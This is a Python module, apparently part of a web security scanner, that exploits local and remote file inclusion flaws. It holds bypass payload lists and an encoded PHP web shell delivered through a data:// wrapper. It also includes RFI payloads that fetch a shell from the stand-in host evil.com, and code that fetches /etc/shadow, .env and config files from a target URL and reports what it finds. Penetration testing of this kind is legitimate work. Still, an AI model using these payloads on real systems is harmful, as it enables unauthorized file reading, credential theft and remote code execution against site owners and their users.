"""
LFI/RFI (Local/Remote File Inclusion) Exploitation Module.
Tests for path traversal and file inclusion vulnerabilities.
"""
import re
import logging
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import requests
from dataclasses import dataclass

logger = logging.getLogger(__name__)

# LFI payloads for different OS and filter bypasses
LFI_PAYLOADS = {
    # Basic path traversal
    'basic': [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ],
    
    # Null byte injection (older PHP)
    'null_byte': [
        '../../../etc/passwd%00',
        '../../../etc/passwd\x00',
        '../../../etc/passwd%00.php',
        '../../../etc/passwd%00.jpg',
    ],
    
    # Double encoding
    'double_encode': [
        '..%252f..%252f..%252fetc%252fpasswd',
        '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
        '..%c0%af..%c0%afetc%c0%afpasswd',
    ],
    
    # PHP wrappers
    'php_wrappers': [
        'php://filter/convert.base64-encode/resource=/etc/passwd',
        'php://filter/read=string.rot13/resource=/etc/passwd',
        'php://input',
        'php://filter/convert.base64-encode/resource=index.php',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
        'expect://id',
        'phar://test.phar/test.txt',
    ],
    
    # Windows-specific
    'windows': [
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '..\\..\\..\\windows\\win.ini',
        '..\\..\\..\\boot.ini',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '\\\\localhost\\c$\\windows\\win.ini',
    ],
    
    # Linux-specific sensitive files
    'linux': [
        '../../../etc/passwd',
        '../../../etc/shadow',
        '../../../etc/hosts',
        '../../../proc/self/environ',
        '../../../proc/self/cmdline',
        '../../../var/log/apache2/access.log',
        '../../../var/log/auth.log',
        '../../../home/.bash_history',
    ],
    
    # Application-specific files
    'app_files': [
        '../../../app/config/database.yml',
        '../../../config/database.yml',
        '../../../.env',
        '../../../wp-config.php',
        '../../../configuration.php',
        '../../../settings.py',
        '../../../web.config',
    ],
}

# RFI payloads
RFI_PAYLOADS = [
    'http://evil.com/shell.txt',
    'https://raw.githubusercontent.com/test/shell.txt',
    '//evil.com/shell.txt',
    'ftp://evil.com/shell.txt',
    'dict://evil.com:11111/',
    'gopher://evil.com/_test',
]

# Evidence patterns for successful LFI
LFI_INDICATORS = {
    'linux_passwd': r'root:.*:0:0:',
    'linux_shadow': r'root:\$[0-9]+\$',
    'linux_hosts': r'127\.0\.0\.1\s+localhost',
    'windows_hosts': r'127\.0\.0\.1\s+localhost',
    'windows_ini': r'\[extensions\]|\[fonts\]',
    'php_source': r'<\?php|<\?=',
    'config_file': r'(password|passwd|secret|key|token)\s*[:=]',
    'env_file': r'[A-Z_]+=[^\n]+',
}

@dataclass 
class FileInclusionResult:
    url: str
    parameter: str
    payload: str
    technique: str
    file_accessed: str
    success: bool
    evidence: str
    method: str = 'GET'

class FileInclusionExploiter:
    """
    Advanced LFI/RFI exploitation engine.
    """
    
    def __init__(self, timeout: int = 15):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        self.tested_count = 0
    
    def exploit(self, url: str, test_rfi: bool = False) -> List[FileInclusionResult]:
        """Test for file inclusion vulnerabilities."""
        results = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Target params likely to be vulnerable
        if not params:
            params = {
                'file': ['test'], 'page': ['home'], 'path': ['index'],
                'include': ['header'], 'template': ['default'], 'doc': ['readme'],
                'folder': ['docs'], 'style': ['blue'], 'lang': ['en'],
            }
        
        for param_name in params:
            logger.info(f"Testing file inclusion in: {param_name}")
            
            # Test LFI categories
            for category, payloads in LFI_PAYLOADS.items():
                for payload in payloads[:5]:
                    result = self._test_lfi(url, param_name, payload, category, params)
                    if result:
                        results.append(result)
                        break
            
            # Test RFI if enabled
            if test_rfi:
                for payload in RFI_PAYLOADS[:3]:
                    result = self._test_rfi(url, param_name, payload, params)
                    if result:
                        results.append(result)
                        break
        
        logger.info(f"File inclusion scan: {len(results)} vulns, {self.tested_count} tests")
        return results
    
    def _test_lfi(self, url: str, param: str, payload: str, category: str, params: dict) -> Optional[FileInclusionResult]:
        """Test single LFI payload."""
        test_url = self._build_url(url, param, payload, params)
        
        try:
            response = self.session.get(test_url, timeout=self.timeout)
            self.tested_count += 1
            
            file_content, file_type = self._detect_file_content(response.text)
            if file_content:
                logger.warning(f"LFI found: {param} -> {file_type}")
                return FileInclusionResult(
                    url=test_url,
                    parameter=param,
                    payload=payload,
                    technique=f'lfi_{category}',
                    file_accessed=file_type,
                    success=True,
                    evidence=file_content[:500],
                )
        except Exception as e:
            logger.debug(f"LFI test error: {e}")
        
        return None
    
    def _test_rfi(self, url: str, param: str, payload: str, params: dict) -> Optional[FileInclusionResult]:
        """Test remote file inclusion."""
        test_url = self._build_url(url, param, payload, params)
        
        try:
            response = self.session.get(test_url, timeout=self.timeout)
            self.tested_count += 1
            
            # RFI indicators: external content included or error revealing attempt
            if 'shell' in response.text.lower() or 'evil.com' in response.text.lower():
                logger.warning(f"Potential RFI: {param}")
                return FileInclusionResult(
                    url=test_url,
                    parameter=param,
                    payload=payload,
                    technique='rfi',
                    file_accessed='remote_file',
                    success=True,
                    evidence="Remote file appears to be processed",
                )
        except Exception as e:
            logger.debug(f"RFI test error: {e}")
        
        return None
    
    def _build_url(self, url: str, param: str, payload: str, params: dict) -> str:
        parsed = urlparse(url)
        test_params = {k: v[:] for k, v in params.items()}
        test_params[param] = [payload]
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            '', urlencode(test_params, doseq=True), ''
        ))
    
    def _detect_file_content(self, html: str) -> tuple[Optional[str], str]:
        """Detect if response contains file contents."""
        for file_type, pattern in LFI_INDICATORS.items():
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(html), match.end() + 200)
                return html[start:end], file_type
        return None, ''


def run_lfi_exploitation(url: str) -> List[Dict[str, Any]]:
    """Run LFI/RFI exploitation."""
    exploiter = FileInclusionExploiter()
    results = exploiter.exploit(url)
    
    findings = []
    for result in results:
        severity = 'CRITICAL' if result.technique == 'rfi' or 'shadow' in result.file_accessed else 'HIGH'
        
        findings.append({
            'issue': f'File Inclusion ({result.technique.upper()})',
            'severity': severity,
            'category': 'lfi',
            'impact': f'Arbitrary file read achieved. Attacker accessed "{result.file_accessed}". May lead to source code disclosure, credential theft, or RCE.',
            'description': f'{result.technique.replace("_", " ").title()} vulnerability in "{result.parameter}". Sensitive file contents retrieved.',
            'recommendation': 'Never use user input directly in file operations. Use allowlists for permitted files. Disable dangerous PHP wrappers.',
            'affected_element': f'GET {result.parameter}',
            'score_impact': 35 if severity == 'CRITICAL' else 25,
            'evidence': result.evidence[:500],
            'poc': f'''# LFI Proof of Concept
curl "{result.url}"
# File accessed: {result.file_accessed}
''',
            'confidence': 'HIGH',
        })
    
    return findings
